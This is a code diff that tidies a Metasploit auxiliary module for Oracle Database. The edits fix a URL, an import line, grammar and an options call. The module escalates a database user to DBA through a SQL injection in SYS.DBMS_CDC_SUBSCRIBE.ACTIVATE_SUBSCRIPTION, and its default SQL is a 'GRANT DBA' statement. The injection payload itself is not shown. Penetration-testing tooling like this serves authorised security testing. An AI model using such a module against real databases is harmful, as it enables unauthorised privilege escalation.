@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION',
       'Description'    => %q{
-        This module will escalate a Oracle DB user to DBA by exploiting an sql injection
+        This module will escalate an Oracle DB user to DBA by exploiting a sql injection
         bug in the SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function.
         This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and
         10g up to 10.1.0.4.
@@ -37,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),
-      ], self.class)
+      ])
   end
 
   def run
